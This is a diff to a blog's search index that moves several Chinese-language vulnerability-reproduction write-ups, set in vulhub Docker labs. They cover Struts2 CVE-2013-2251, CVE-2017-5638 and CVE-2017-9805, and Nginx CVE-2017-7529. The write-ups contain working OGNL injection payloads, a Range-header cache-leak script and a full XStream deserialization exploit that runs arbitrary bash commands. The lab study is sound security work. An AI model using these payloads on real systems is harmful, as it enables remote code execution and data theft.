@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CVE-2013-2251 Apache Struts 2 远程代码执行漏洞</title>
-    <url>/2026/02/03/CVE-2013-2251/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.0.0 - 2.3.15</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Struts2 中，DefaultActionMapper 类支持以” action:”、” redirect:”、” redirectAction” 作为导航或重定向过滤，在这些前缀后面可以加入 OGNL 表达式，Struts2 没有对这些前缀做过滤，可以利用 OGNL 表达式调用 Java 静态方法执行任意系统命令</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-016</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773316394891.png" alt="1773316394891"></p>
-<p>访问 http://公网: 8080，出现 Hello world 即搭建成功</p>
-<p><img src="1773316436796.png" alt="1773316436796"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/index.action 数据包</p>
-<p><img src="1773316494758.png" alt="1773316494758"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="1773316540251.png" alt="1773316540251"><br>在 action 后添加 payload，括号已经经过 url 编码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?redirect:%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'id'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3D(new%20java.io.InputStreamReader(%23b))%2C%23d%3D(new%20java.io.BufferedReader(%23c))%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773316578390.png" alt="1773316578390"></p>
-<p>发送后页面出现 id 结果</p>
-<p><img src="1773316617088.png" alt="1773316617088"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Nginx 文件名逻辑漏洞 CVE-2013-4547</title>
     <url>/2026/02/12/CVE-2013-4547/</url>
     <content><![CDATA[<h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><ul>
@@ -145,6 +110,111 @@
       </tags>
   </entry>
   <entry>
+    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
+    <url>/2026/02/04/CVE-2017-5638/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.3.5 – 2.3.31</li>
+<li>Struts 2.5 – 2.5.10</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以通过 docker ps 查看镜像</p>
+<p><img src="1773317613909.png" alt="1773317613909"></p>
+<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
+<p><img src="1773317657503.png" alt="1773317657503"></p>
+<p>使用 Repeater 模块</p>
+<p><img src="1773317777800.png" alt="1773317777800"></p>
+<p>随便添加参数</p>
+<p><img src="1773317706752.png" alt="1773317706752"></p>
+<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773317824744.png" alt="1773317824744"></p>
+<p>发送后，响应码为 200，且执行了命令 id</p>
+<p><img src="1773317875838.png" alt="1773317875838"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2013-2251 Apache Struts 2 远程代码执行漏洞</title>
+    <url>/2026/02/03/CVE-2013-2251/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.0.0 - 2.3.15</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Struts2 中，DefaultActionMapper 类支持以” action:”、” redirect:”、” redirectAction” 作为导航或重定向过滤，在这些前缀后面可以加入 OGNL 表达式，Struts2 没有对这些前缀做过滤，可以利用 OGNL 表达式调用 Java 静态方法执行任意系统命令</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-016</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773316394891.png" alt="1773316394891"></p>
+<p>访问 http://公网: 8080，出现 Hello world 即搭建成功</p>
+<p><img src="1773316436796.png" alt="1773316436796"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/index.action 数据包</p>
+<p><img src="1773316494758.png" alt="1773316494758"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="1773316540251.png" alt="1773316540251"><br>在 action 后添加 payload，括号已经经过 url 编码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?redirect:%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B'id'%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3D(new%20java.io.InputStreamReader(%23b))%2C%23d%3D(new%20java.io.BufferedReader(%23c))%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773316578390.png" alt="1773316578390"></p>
+<p>发送后页面出现 id 结果</p>
+<p><img src="1773316617088.png" alt="1773316617088"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx 整数溢出漏洞 CVE-2017-7529</title>
+    <url>/2026/02/09/CVE-2017-7529/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Nginx  0.5.6 - 1.13.2</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>整数溢出</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>Nginx 开启了缓存功能</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>信息泄露</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Nginx 处理 Range 请求的模块计算请求范围时候使用了 64 位有符号整数，在计算多段请求时候，Nginx 会计算总的返回长度，攻击者通过给出接近 64 位整数机选大数字，两个负数相减或正数相加，结果超过 64 位整数能表示的最大范围，这个数值在计算机内部发生了溢出。当 Nginx 开启了缓存，存文件的格式不是纯文本，而是包含 KEY、过期时间、后端服务器信息，后端返回的原始头信息，以及真正的网页内容，由于漏洞导致的整数溢出（没做边界检验），攻击者构造负数起始位置，在通过整数溢出使得请求变得合理（大整数与负数相加后整数溢出变成极小的数，极小的数小于实际文件总长，使服务器认为请求合理），Nginx 内部计算的原始读取位置发生了偏移，可以让出错的指针刚好落到缓存头区域，进而读到缓存的内容</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/nginx/CVE-2017-7529</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773155403452.png" alt="1773155403452"></p>
+<p>写攻击脚本</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 确保指向 50x.html，通常情况会用目录爆破工具查找被缓存的静态资源，文件名字要对，如果请求文件不存在会返回404</span><br><span class="line">url = 'http://靶机:8080/50x.html'</span><br><span class="line"></span><br><span class="line">checker = requests.get(url)</span><br><span class="line">print(f"Cache Status: {checker.headers.get('X-Proxy-Cache')}")</span><br><span class="line"></span><br><span class="line">file_len = len(checker.content)</span><br><span class="line">offset = 606 </span><br><span class="line"></span><br><span class="line">p1 = file_len + offset</span><br><span class="line">p2 = 0x8000000000000000 - p1</span><br><span class="line">headers = {</span><br><span class="line">    'Range': f'bytes=-{p1}, -{p2}'</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">print(f"Status Code: {r.status_code}")</span><br><span class="line">if r.status_code == 206:</span><br><span class="line">    print("\n--- 成功！泄露内容如下 ---")</span><br><span class="line">    print(r.content)</span><br><span class="line">else:</span><br><span class="line">    print("\n--- 失败 ---")</span><br><span class="line">    print("返回的还是 200，说明没触发溢出。请尝试再运行一次脚本以确保缓存 HIT。")</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773155515533.png" alt="1773155515533"></p>
+<p>运行脚本，返回 200 且看到泄露的内容</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773155564688.png" alt="1773155564688"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Struts2 远程代码执行漏洞 CVE-2018-11776</title>
     <url>/2026/02/04/CVE-2018-11776/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
@@ -188,38 +258,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nginx 整数溢出漏洞 CVE-2017-7529</title>
-    <url>/2026/02/09/CVE-2017-7529/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Nginx  0.5.6 - 1.13.2</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>整数溢出</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>Nginx 开启了缓存功能</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>信息泄露</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Nginx 处理 Range 请求的模块计算请求范围时候使用了 64 位有符号整数，在计算多段请求时候，Nginx 会计算总的返回长度，攻击者通过给出接近 64 位整数机选大数字，两个负数相减或正数相加，结果超过 64 位整数能表示的最大范围，这个数值在计算机内部发生了溢出。当 Nginx 开启了缓存，存文件的格式不是纯文本，而是包含 KEY、过期时间、后端服务器信息，后端返回的原始头信息，以及真正的网页内容，由于漏洞导致的整数溢出（没做边界检验），攻击者构造负数起始位置，在通过整数溢出使得请求变得合理（大整数与负数相加后整数溢出变成极小的数，极小的数小于实际文件总长，使服务器认为请求合理），Nginx 内部计算的原始读取位置发生了偏移，可以让出错的指针刚好落到缓存头区域，进而读到缓存的内容</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/nginx/CVE-2017-7529</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773155403452.png" alt="1773155403452"></p>
-<p>写攻击脚本</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 确保指向 50x.html，通常情况会用目录爆破工具查找被缓存的静态资源，文件名字要对，如果请求文件不存在会返回404</span><br><span class="line">url = 'http://靶机:8080/50x.html'</span><br><span class="line"></span><br><span class="line">checker = requests.get(url)</span><br><span class="line">print(f"Cache Status: {checker.headers.get('X-Proxy-Cache')}")</span><br><span class="line"></span><br><span class="line">file_len = len(checker.content)</span><br><span class="line">offset = 606 </span><br><span class="line"></span><br><span class="line">p1 = file_len + offset</span><br><span class="line">p2 = 0x8000000000000000 - p1</span><br><span class="line">headers = {</span><br><span class="line">    'Range': f'bytes=-{p1}, -{p2}'</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">print(f"Status Code: {r.status_code}")</span><br><span class="line">if r.status_code == 206:</span><br><span class="line">    print("\n--- 成功！泄露内容如下 ---")</span><br><span class="line">    print(r.content)</span><br><span class="line">else:</span><br><span class="line">    print("\n--- 失败 ---")</span><br><span class="line">    print("返回的还是 200，说明没触发溢出。请尝试再运行一次脚本以确保缓存 HIT。")</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773155515533.png" alt="1773155515533"></p>
-<p>运行脚本，返回 200 且看到泄露的内容</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773155564688.png" alt="1773155564688"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Nginx</tag>
       </tags>
   </entry>
   <entry>
@@ -271,44 +309,6 @@
 <p><img src="1773318862330.png" alt="1773318862330"></p>
 <p>攻击脚本（<a href="https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py</a>）</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#python3兼容脚本，cve-2017-9805.py</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">from xml.dom.minidom import parseString</span><br><span class="line"></span><br><span class="line">random_string = lambda num: ''.join(random.choice("QWERTYUIOPASDFGHJKLXZCVBNMqwertyuiopasdfghjklzxcvbnm1234567890") for _ in range(num))</span><br><span class="line"></span><br><span class="line"># iterates over the elements in the template XML object and replaces with desired commands</span><br><span class="line">def get_item_list(itemlist, encoded_command, the_match):</span><br><span class="line">    for item in itemlist:</span><br><span class="line">        for item2 in item.childNodes:</span><br><span class="line">            if item2.nodeValue == the_match:</span><br><span class="line">                item2.nodeValue = encoded_command</span><br><span class="line"></span><br><span class="line">def main(url, command):</span><br><span class="line">    filename = "." + random_string(20) + '.tmp'</span><br><span class="line">    print('[+] Encoding Command')</span><br><span class="line">    </span><br><span class="line">    # Python 3 base64 logic: encode string to bytes, then b64encode, then back to string</span><br><span class="line">    b64_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')</span><br><span class="line">    </span><br><span class="line">    # Construct the shell command that will be placed inside XML</span><br><span class="line">    # Using tee -a to write the decoded command to a file, then execute it</span><br><span class="line">    encoded_command = f'echo {b64_command} | base64 -d | tee -a /tmp/{filename} ; /bin/bash /tmp/{filename} ; /bin/rm /tmp/{filename}'</span><br><span class="line">    </span><br><span class="line">    print('[+] Building XML object')</span><br><span class="line">    # The XML payload (ImageIO exploit chain)</span><br><span class="line">    payload_xml = (</span><br><span class="line">        '&lt;map&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString&gt;&lt;flags&gt;0&lt;/flags&gt;'</span><br><span class="line">        '&lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;'</span><br><span class="line">        '&lt;dataHandler&gt;&lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;'</span><br><span class="line">        '&lt;is class="javax.crypto.CipherInputStream"&gt;&lt;cipher class="javax.crypto.NullCipher"&gt;'</span><br><span class="line">        '&lt;initialized&gt;false&lt;/initialized&gt;&lt;opmode&gt;0&lt;/opmode&gt;&lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;'</span><br><span class="line">        '&lt;iter class="javax.imageio.spi.FilterIterator"&gt;&lt;iter class="java.util.Collections$EmptyIterator"/&gt;'</span><br><span class="line">        '&lt;next class="java.lang.ProcessBuilder"&gt;&lt;command&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;string&gt;-c&lt;/string&gt;'</span><br><span class="line">        '&lt;string&gt;COMMANDWILLGOHERE&lt;/string&gt;&lt;/command&gt;&lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;&lt;/next&gt;&lt;/iter&gt;'</span><br><span class="line">        '&lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;&lt;method&gt;&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;'</span><br><span class="line">        '&lt;name&gt;start&lt;/name&gt;&lt;parameter-types/&gt;&lt;/method&gt;&lt;name&gt;foo&lt;/name&gt;&lt;/filter&gt;&lt;next class="string"&gt;foo&lt;/next&gt;'</span><br><span class="line">        '&lt;/serviceIterator&gt;&lt;lock/&gt;&lt;/cipher&gt;&lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;'</span><br><span class="line">        '&lt;ibuffer/&gt;&lt;done&gt;false&lt;/done&gt;&lt;ostart&gt;0&lt;/ostart&gt;&lt;ofinish&gt;0&lt;/ofinish&gt;&lt;closed&gt;false&lt;/closed&gt;&lt;/is&gt;'</span><br><span class="line">        '&lt;consumed&gt;false&lt;/consumed&gt;&lt;/dataSource&gt;&lt;transferFlavors/&gt;&lt;/dataHandler&gt;&lt;dataLen&gt;0&lt;/dataLen&gt;&lt;/value&gt;'</span><br><span class="line">        '&lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/&gt;'</span><br><span class="line">        '&lt;/entry&gt;&lt;entry&gt;&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;'</span><br><span class="line">        '&lt;jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/&gt;&lt;/entry&gt;&lt;/map&gt;'</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    xml_exploit = parseString(payload_xml)</span><br><span class="line">    header = {</span><br><span class="line">        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',</span><br><span class="line">        'Content-Type': 'application/xml'</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    itemlist = xml_exploit.getElementsByTagName('string')</span><br><span class="line">    print('[+] Placing command in XML object')</span><br><span class="line">    get_item_list(itemlist, encoded_command, "COMMANDWILLGOHERE")</span><br><span class="line">    </span><br><span class="line">    print('[+] Converting Back to String')</span><br><span class="line">    # Convert back to bytes for the request</span><br><span class="line">    exploit_data = xml_exploit.toxml(encoding='utf-8')</span><br><span class="line">    </span><br><span class="line">    print('[+] Making Post Request with our payload')</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, data=exploit_data, headers=header, timeout=15)</span><br><span class="line">        print(f'[+] Server returned status code: {response.status_code}')</span><br><span class="line">        print('[+] Payload sent.')</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f'[-] Error: {e}')</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    parser = argparse.ArgumentParser(description="CVE-2017-9805 Struts RCE Exploit")</span><br><span class="line">    parser.add_argument('-u', '--url', type=str, required=True, help='Target URL (e.g. http://ip:8080/orders/3)')</span><br><span class="line">    parser.add_argument('-c', '--command', type=str, required=True, help='Command to execute')</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    main(args.url, args.command)</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
-    <url>/2026/02/04/CVE-2017-5638/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3.5 – 2.3.31</li>
-<li>Struts 2.5 – 2.5.10</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p>可以通过 docker ps 查看镜像</p>
-<p><img src="1773317613909.png" alt="1773317613909"></p>
-<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
-<p><img src="1773317657503.png" alt="1773317657503"></p>
-<p>使用 Repeater 模块</p>
-<p><img src="1773317777800.png" alt="1773317777800"></p>
-<p>随便添加参数</p>
-<p><img src="1773317706752.png" alt="1773317706752"></p>
-<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773317824744.png" alt="1773317824744"></p>
-<p>发送后，响应码为 200，且执行了命令 id</p>
-<p><img src="1773317875838.png" alt="1773317875838"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
